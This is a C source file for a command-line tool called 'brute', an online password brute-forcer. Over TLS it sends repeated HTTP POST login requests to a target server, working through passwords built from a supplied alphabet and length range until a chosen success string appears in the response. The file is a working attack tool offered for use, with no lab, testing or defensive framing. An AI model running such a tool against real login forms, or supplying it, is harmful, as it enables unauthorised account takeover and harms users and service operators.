#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <unistd.h>

#define ERROR			(-1)
#define MAX				4096
#define COLOR_RED		"\x1b[1;31m"
#define COLOR_GREEN		"\x1b[1;32m"
#define COLOR_BLUE		"\x1b[1;34m"
#define COLOR_RESET     "\x1b[0m"

#define header	"POST %s HTTP/1.1\r\n"									\
				"Host: %s\r\n"											\
				"Content-Type: application/x-www-form-urlencoded\r\n"	\
				"Content-Length: %d\r\n\r\n"							\
				"%s&%s="
#define USAGE	"brute:\n"\
				"\t\t-u\tserver-url\t------server url\n"\
				"\t\t-a\talphabet\t------alphabet to be used in sequential\n"\
				"\t\t\t\t\torder of letters, symbols and numbers\n"\
				"\t\t-l\tuser=username\t------user is the login script which is\n"\
				"\t\t\t\t\tcommonly adopted as 'user' on some servers\n"\
				"\t\t-p\tpass\t\t------pass is the password script which is\n"\
				"\t\t\t\t\tcommonly adopted as 'pass' on some servers\n"\
				"\t\t-min\tpassword-min\t------minimum password length\n"\
				"\t\t-max\tpassword-max\t------maximum password length\n"\
				"\t\t-s\tsucess\t\t------success message\n"

char * alphabet;
char * url  = NULL;
char * name = NULL;
char * user = NULL;
char * pass = NULL;
char * login = NULL;
char * success = NULL;
char cookie[512];
unsigned min = 0;
unsigned max = 65535;
unsigned length;
unsigned max_alphabet;

void print(const char * format, ...)
{
    va_list args;
    
    va_start(args, format);
	putchar('\n');
    vprintf(format, args);
	putchar('\n');
    va_end(args);
    exit(EXIT_FAILURE);
}

void error(const char * msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void parse_args(int argc, char * argv[])
{
	char * max_s, * min_s;
	
	for (int i = 0; i < argc; i++)
		if (argv[i][0] == '-')
			if (strcmp(argv[i], "-u") == 0)
				url = argv[++i];
			else if (strcmp(argv[i], "-a") == 0)
				alphabet = argv[++i];
			else if (strcmp(argv[i], "-l") == 0) {
				user = argv[++i];
				login = strchr(user, '=');
				if (login++ == NULL)
					print("login string need '='");
			} else if (strcmp(argv[i], "-p") == 0)
				pass = argv[++i];
			else if (strcmp(argv[i], "-min") == 0)
				min = atoi(argv[++i]);
			else if (strcmp(argv[i], "-max") == 0)
				max = atoi(argv[++i]);
			else if (strcmp(argv[i], "-s") == 0)
				success = argv[++i];
			else if (strcmp(argv[i], "-h") == 0)
				print(USAGE);
			else
				print("no option '%s'", argv[i]);
		else
			name = argv[i];
}

void set_cookie(char * response)
{
	int i = 8;
	char * cookiep;
	
	cookiep = strstr(response, "Set-Cookie: ");
	bzero(cookie, sizeof (cookie));
	strcpy(cookie, "Cookie: ");
begin:
	cookiep += 12;
	for (int j = 0; cookiep[j] != ';'; i++, j++)
		cookie[i] = cookiep[j];
	cookiep = strstr(cookiep, "Set-Cookie: ");
	if (cookiep != NULL) {
		cookie[i++] = ',';
		cookie[i++] = ' ';
		goto begin;
	}
	strcat(cookie, "\r\n\r\n");
}

void send_request(SSL * ssl, char request[], int req_len)
{
	char response[MAX];
	
	if (SSL_write(ssl, request, req_len) <= 0)
		print(COLOR_RED "error: SSL_write" COLOR_RESET);
	if (SSL_read(ssl, response, MAX) <= 0)
		print(COLOR_RED "error: SSL_read" COLOR_RESET);
	if (strncmp(response, "HTTP/1.1 200", 12) != 0)
		print(response);
	//set_cookie(response);
	if (SSL_read(ssl, response, MAX) <= 0)
		print(COLOR_RED "error: SSL_read" COLOR_RESET);
	if (strstr(response, success) != 0) {
		putchar('\n');
		exit(EXIT_SUCCESS);
	}
}

void try(SSL * ssl, char request[], int i, int j)
{
	for (int k = 0; k < max_alphabet; k++) {
		request[i] = alphabet[k];
		putchar(alphabet[k]);
		if (i+1 < j)
			try(ssl, request, i+1, j);
		else
			send_request(ssl, request, j);
		putchar('\b');
	}
}

void brute(SSL * ssl)
{
	char request[MAX];
	
	for (unsigned i = min; i <= max; i++) {
		sprintf(request, header, url, name,
				length+i, user, pass);
		unsigned req_len = strlen(request);
		try(ssl, request, req_len, req_len+i);
	}
}

int main(int argc, char * argv[])
{
    int client;
	struct hostent * host;
	struct sockaddr_in addr;
	SSL_CTX * ctx;
	SSL * ssl;

	if (argc < 7)
		print(USAGE);
	else {
		parse_args(argc, argv);

		host = gethostbyname(name);

		if (host == NULL) {
			herror("gethostbyname");
			exit(EXIT_FAILURE);
		}

		bzero(&addr, sizeof(addr));
		bcopy(host->h_addr, &addr.sin_addr, host->h_length);

		addr.sin_port   = htons(443);
		addr.sin_family = host->h_addrtype;

		max_alphabet = strlen(alphabet);
		length = strlen(user)+strlen(pass)+2;

		client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

		if (client == ERROR)
			error("socket");
		if (connect(client, (struct sockaddr *)&addr, sizeof(addr)) == ERROR)
			error("connect");

		ctx = SSL_CTX_new(SSLv23_client_method());

		SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2);

		ssl = SSL_new(ctx);

		SSL_set_fd(ssl, client);
		SSL_connect(ssl);

		printf(COLOR_BLUE "~[%s] " COLOR_RESET, name);
		printf(COLOR_BLUE "login:" COLOR_RESET " %s ", login);
		printf(COLOR_BLUE "password: " COLOR_RESET);

		brute(ssl);

		puts(COLOR_RED "not found :( " COLOR_RESET);

		close(client);
	}

	return 0;
}
